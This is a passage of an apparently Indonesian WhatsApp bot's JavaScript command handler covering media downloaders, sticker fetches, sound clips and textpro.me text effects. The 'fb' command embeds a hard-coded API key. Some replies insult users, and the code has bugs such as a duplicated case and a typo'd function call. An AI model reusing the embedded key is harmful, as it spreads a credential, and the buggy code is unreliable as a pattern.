onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
atak.sendImageAsSticker(from, pjr, ridho)
}
)
break
case 'gura':
if (!isRegist) return onlyRegist()
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
atak.sendImageAsSticker(from, pjr, ridho)
}
)
break
case 'doge':
if (!isRegist) return onlyRegist()
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
atak.sendImageAsSticker(from, pjr, ridho)
}
)
break
//================================================================================\\
case 'play':{
if (!isRegist) return onlyRegist()
if(!q) return setReply("Teksnya mana om")
onlyWait()
let rus = await yts(q)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')
try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
try{
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/default.jpg`
}
let inithumb = await getBuffer(thumbnya)
let options2 =
{ 
externalAdReply: {
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────    click here to play music `,
description: 'Now Playing...',
mediaType: 1,
renderLargerThumbnail : true,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}
}
var toks =`
📂 Judul : ${res.title}
🌐 Ditonton : ${h2k(res.views)} Kali 
⏳ Durasi : ${res.timestamp}
👤 Channel : ${res.author.name}
🎧 Audio : ${FileSize(audio[0].contentLength)} 
🎬 Video : ${FileSize(format.contentLength)}`

let aklo = [
{"buttonId": `${prefix}playmp3 ${res.url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${res.url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
Sendbutdocument(from, `*YOUTUBE DOWNLOADER*\n${toks}`, fake, fs.readFileSync('./media/image/thumbnaildokumen.jpg'), aklo, options2)
}
break
case 'playmp3':
if (!isRegist) return onlyRegist()
if(!isUrl) return setReply("Masukan link")
try{
setReply("*Downloading...*")
let info = await ytdl.getInfo(q);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if(Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
if(audioFormats[0].contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload audio lebih dari 10 menit")
}
downloadMp3(q) 
} catch (err){
console.log(err)
}
break
case 'playmp4':{
if (!isRegist) return onlyRegist()
if(!isUrl) return setReply("Masukan link")
let info = await ytdl.getInfo(q);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
if(format.contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload video lebih dari 10 menit")
}
setReply("*Downloading...*")
downloadMp4 (q) 
}
break
case 'playmusic':
{
if (!isRegist) return onlyRegist()
if(!q) return setReply("Masukan judul lagu")
onlyWait()
if(q.startsWith("https://")){
let atak = q.replace('https://m.', 'https://')
let scdl = await SoundCloud.create();
let res = await scdl.tracks.getTrack(atak)
console.log(res)
let teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`
try{
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
atak.sendButImage(from, teks, fake, yamiyami, nano, {contextInfo: forward}) 
} else {
let scdl = await SoundCloud.create();
let result = await scdl.search({
query: q,
limit: 20, 
offset: 0, 
filter: 'tracks' 
});
let res = result.collection[0] 
try{
var artis = res.publisher_metadata.artist
var album = res.publisher_metadata.album_title
} catch (err){
var artis = res.user.full_name
var album = "Tidak ada"
}
console.log(res)
let teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
👤 Artis : ${artis}
💽 Album : ${album}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`
try{
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
atak.sendButImage(from, teks, fake, yamiyami, nano, {contextInfo: forward}) 
}
}
break
case 'ig':{
if(!q) return setReply("Masukan Link")
setReply(mess.wait)
if (!args[0].match(/https:\/\/www.instagram.com\/(p|reel|tv)/gi)) return setReply(`*Link salah! Perintah ini untuk mengunduh postingan ig/reel/tv, bukan untuk highlight/story!*\n\ncontoh:\n${prefix + command} https://www.instagram.com/p/BmjK1KOD_UG/?utm_medium=copy_link`)
let igreel = q.includes("https://www.instagram.com/reel/")
let kuntul = await instagramdlv3(args[0])
for (const { url } of kuntul) await atak.sendMedia(from, url, ridho, {caption: "Nih"})
}
break
case 'gimage':{
if (!isRegist) return onlyRegist()
if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
try{
googleImage(q).then(async (data) => {
let foto = data[Math.floor(Math.random() * data.length)]
if(data.length == "0") return setReply("Image tidak di temukan")
onlyWait()
atak.sendMedia (from, foto, ridho, {caption: "Nih"})
})
} catch(err){
let teks = args.join(' ')
let res = await gis(teks, google)
function google(error, result){
if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
atak.sendMedia (from, random, ridho, {caption:  `*Hasil Pencarian Dari :* ${teks}`})
}
}
}
}
break
case 'tiktoknowm': 
case 'tiktok':{   
if (!isRegist) return onlyRegist()
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
tiktokdlv2(lin).then(res => {
let buttons = [
{"buttonId": `${prefix}tiktokmusik ${args[0]} `,"buttonText": {"displayText": `audio`},"type": "RESPONSE"}]
let ep = res.video.no_watermark
console.log(ep)
atak.sendMessage(from, {caption: "Nih", video: {url: ep}, buttons},{quoted: setQuoted})
})
}
break
case 'tiktokmusik':{       
if (!isRegist) return onlyRegist()
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
tiktokdlv2(lin).then( async res => {
let ep = res.video.no_watermark                    
let atak = await getBuffer(ep)
let ran = getRandom('.mp3')
let ron = getRandom('.mp4')
fs.writeFileSync(ron, atak)
exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
fs.unlinkSync(ron)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
atak.sendMessage(from, { audio: buffer453, mimetype: 'audio/mp4'}, { quoted: ridho })
fs.unlinkSync(ran)
})
})
}
break
case 'pinterest':
if (!isRegist) return onlyRegist()
if (args.length < 2) return reply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
reply(mess.wait)
var jumlah;
if (q.includes('--')) jumlah = q.split('--')[1]
pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
if (q.includes('--')) {
if (data.result.length < jumlah) {
jumlah = data.result.length
reply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
}
for (let i = 0; i < jumlah; i++) {
atak.sendMessage(from, { image: { url: data.result[i] }})
}
} else {
var but = [{buttonId: `${command} ${q}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
atak.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: ridho })
}
})
break
case 'spotify':{
if (!isRegist) return onlyRegist()
if(!q) return setReply("Masukan link Spotify")
let data = await spotify.getTrack(q) 
let teks =`
Nama: ${data.name}
Artists: ${data.artists.join(' ')}
Album : ${data.album_name}
Release: ${data.release_date}

Mohon tunggu, sedang mengirim
File audio ${data.name}
`
await atak.sendMessage(from, {caption: teks, image: { url: data.cover_url}, mimetype:  "image/jpeg" }, {quoted: ridho})        
let song = await spotify.downloadTrack(q)
console.log(song)
await atak.sendMessage(from, {audio: song, mimetype:  'audio/mp3' }, {quoted: ridho})        
}
break
case 'ytmp3':
{
if (!isRegist) return onlyRegist()
if(!q) return setReply("Masukan link youtube")
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}
let link =`https://youtube.com/watch?v=${videoId}` 
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Musik tidak di temukan")
try{
var foto = `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg`
} catch (err){
var foto = anu.all[0].image
}
try{
let info = await ytdl.getInfo(link);
let format = ytdl.filterFormats(info.formats, 'audioonly');
if(Number(format.contentLength) > 20000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE AUDIO DOWNLOADER*

📂 Title : ${info.videoDetails.title}
📄 Size : ${FileSize(format[0].contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
📊 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
👤 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await atak.sendMessage(from, {image: {url: foto}, caption: teks},{quoted: ridho})
downloadMp3(q) 
} catch(err){
setReply(err)
}
}
break
case 'ytmp4':
try{
if (!isRegist) return onlyRegist()
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")
if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}
let link =`https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Video tidak di temukan")
let info = await ytdl.getInfo(link);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE VIDEO DOWNLOADER*

📂 Title : ${anu.all[0].title}
💾 Ext : 360p
📄 Size : ${FileSize(format.contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
🌎 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
📹 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await atak.sendMessage(from, {image: {url: anu.all[0].image}, caption: teks},{quoted: ridho})
downloadMp4(q) 
} catch(err){
setReply(`${err}`)
}
break
case 'mediafire':{
if (!isRegist) return onlyRegist()
if(q.startsWith("https://www.mediafire.com")){
let atak = await mediafiredl(q)
if(atak.filename == "") return setReply("Error itu bukan file, kalo ga tau cara make mediafire mending ga usah make") 
console.log(atak)
let tuks =`
Data succesfull obtained

File Name : ${atak.filename}
File Size : ${atak.filesizeH}
Upload : ${atak.aploud}
`
await setReply(tuks)
if(atak.filesize > 50000 && !isOwner){
if(sender.startsWith("62")){
let tuks = "Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!"
} else {
let tuks = "You have been banned\nfor abusing the mediafire feature"
}
addBanned(pushname,calender, senderNumber, ban) 
await setReply("File size melebihi batas,\nbatas yang di tentukan adalah 50mb")              
await setReply(tuks)
return
}
await atak.sendMedia (from, atak.url, ridho, {fileName: atak.filename})
} else{
setReply("Link Invalid")
}
}
break
case 'githubdl':{
if (!isRegist) return onlyRegist()
if(!q.includes("|")) return setReply(`Contoh ${prefix}${command}githubdl username|repository`)
let url = `https://github.com/${q.split("|")[0]}/${q.split("|")[1]}/archive/refs/heads/master.zip`
console.log("Done")
setReply(`Waiting for compress to zip`)
await atak.sendMedia (from, url, ridho, {fileName: q.split("|")[1]})
}
break 
case 'gitclone':
try{
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!isRegist) return onlyRegist()
if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
if (!regex.test(q)) return setReply('link salah!')
let [, user, repos] = q.match(regex) || []
let repo = repos.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repos}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
setReply(`*Mohon tunggu, sedang mengirim repository..*`)
await atak.sendMedia (from, url, ridho, {fileName: filename})
} catch (err){
setReply(mess.error.link)
}
break  
case 'igstory': {
if (!isRegist) return onlyRegist()
if (!q) return setReply( `*Perintah ini untuk mengunduh postingan instagram story*\n\nContoh:\n${prefix + command} alinursetiawan24`)
let res = await fetch(`https://megayaa.herokuapp.com/api/igstori?username=${q}`)
if (!res.ok) return setReply('Error')
let json = await res.json()
if (!json.status) return setReply(json)
await setReplty('Sedang di proses..')
for (let { url, type } of json.data) {
await delay(2000)
atak.sendMedia (from, url, ridho, {caption: "Nih"})      
}
}
break
case 'fb': 
try{
let {MessageType} = require('@adiwajshing/baileys')
if (!isRegist) return onlyRegist()
if (!args[0]) return setReply('Putting *URL* Facebook..')
if (!args[0].includes("facebook")) return setReply(`Url is wrong..\n\n*Example:*\n${prefix}fb https://www.facebook.com/juankcortavarriaoficial/videos/218237676749570/`)
let res = await fetch(`https://masgimenz.my.id/facebook/?url=` + args[0])
let json = await res.json()
let url = json.videoUrl
setReply('Sedang diproses...')
if (url) await atak.sendMedia (from, url, ridho, {caption: "Nih"})
else setReply('Link download tidak ditemukan')
} catch (e){
let res = await fetch(`https://api.neoxr.eu.org/api/fb?url=${args[0]}&apikey=obSw1DxesD`)
let json = await res.json()
if (!json.status) setReply( json)
await setReply('Sedang di proses..')
await atak.sendMedia (from, json.data[1].url, ridho, {caption: "Nih"})
}
break
//================================================================================\\
case 'sound1':case 'sound2':case 'sound3':case 'sound4':case 'sound5':
case 'sound6':case 'sound7':case 'sound8':case 'sound9':case 'sound10':
case 'sound11':case 'sound12':case 'sound13':case 'sound14':case 'sound15':
case 'sound16':case 'sound17':case 'sound18':case 'sound19':case 'sound20':
case 'sound21':case 'sound22':case 'sound23':case 'sound24':case 'sound25':
case 'sound26':case 'sound27':case 'sound28':case 'sound29':case 'sound30':
case 'sound31':case 'sound32':case 'sound33':case 'sound34':case 'sound35':
case 'sound36':case 'sound37':case 'sound38':case 'sound39':case 'sound40':
case 'sound41':case 'sound42':case 'sound43':case 'sound44':case 'sound45':
case 'sound46':case 'sound47':case 'sound48':case 'sound49':case 'sound50':
case 'sound51':case 'sound52':case 'sound53':case 'sound54':case 'sound55':
case 'sound56':case 'sound57':case 'sound58':case 'sound59':case 'sound60':
case 'sound61':case 'sound62':case 'sound63':case 'sound64':case 'sound65':
case 'sound66':case 'sound67':case 'sound68':case 'sound69':case 'sound70':
case 'sound71':case 'sound72':case 'sound73':case 'sound74':case 'sound75':
case 'sound76':case 'sound77':case 'sound78':case 'sound79':case 'sound80':
case 'sound81':case 'sound82':case 'sound83':case 'sound84':case 'sound85':
case 'sound86':case 'sound87':case 'sound88':case 'sound89':case 'sound90':
case 'sound91':case 'sound92':case 'sound93':case 'sound94':case 'sound95':
case 'sound96':case 'sound97':case 'sound98':case 'sound99':case 'sound100':
case 'sound101':case 'sound102':case 'sound103':case 'sound104':case 'sound105':
case 'sound106':case 'sound107':case 'sound108':case 'sound109':case 'sound110':
case 'sound111':case 'sound112':case 'sound113':case 'sound114':case 'sound115':
case 'sound116':case 'sound117':case 'sound118':case 'sound119':case 'sound120':
case 'sound121':case 'sound122':case 'sound123':case 'sound124':case 'sound125':
case 'sound126':case 'sound127':case 'sound128':case 'sound129':case 'sound130':
case 'sound131':case 'sound132':case 'sound133':case 'sound134':case 'sound135':
case 'sound136':case 'sound137':case 'sound138':case 'sound139':case 'sound140':
case 'sound141':case 'sound142':case 'sound143':case 'sound144':case 'sound145':
case 'sound146':case 'sound147':case 'sound148':case 'sound149':case 'sound150':
case 'sound151':case 'sound152':case 'sound153':case 'sound154':case 'sound155':
case 'sound156':case 'sound157':case 'sound158':case 'sound159':case 'sound160':
case 'sound161':
if (!isRegist) return onlyRegist() 
let sound = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
atak.sendMessage(from, { audio: sound, mimetype: 'audio/mp4', ptt: true }, { quoted: setQuoted })
break
//================================================================================\\
case 'blackping':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'glitch1':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break	
case 'glitch2':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
`${teks1}`,`${teks2}`])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break	
case 'glitch3':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
`${teks1}`,`${teks2}`])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'lion':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
`${teks1}`,`${teks2}`])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case '3dspace':
{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
`${teks1}`,`${teks2}`])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break		
case '3dneon':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'neon':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/neon-text-effect-online-879.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'greenneon':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/green-neon-text-effect-874.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break   
case 'bokeh':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/bokeh-text-effect-876.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break  
case 'hollographic':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break	
case 'bear':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
`${teks1}`,`${teks2}`])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break		
case 'wolf':
{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
`${teks1}`,`${teks2}`])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break		
case 'joker':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/create-logo-joker-online-934.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break	
case 'dropwater':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'neonlight':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'thewall':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/break-wall-text-effect-871.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'natural':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'carbon':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/carbon-text-effect-833.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'pencil':
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'luxury':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/create-a-3d-luxury-metallic-text-effect-for-free-1071.html", [`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'whitegold':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/elegant-white-gold-3d-text-effect-online-free-1070.html", [`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'lightglow':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait() 
textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'arcane':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/create-text-effects-arcane-tv-series-online-1067.html", [`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'neonlight':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'valentine':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/create-neon-light-on-brick-wall-online-1062.html", [`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'glowingneon':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html", [`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'colorled':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
onlyWait()
textpro("https://textpro.me/color-led-display-screen-text-effect-1059.html", [`${q}`,])
.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case '3dretro':{
if (!isRegist) return onlyRegist() 
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [
`${teks1}`,`${teks2}`])
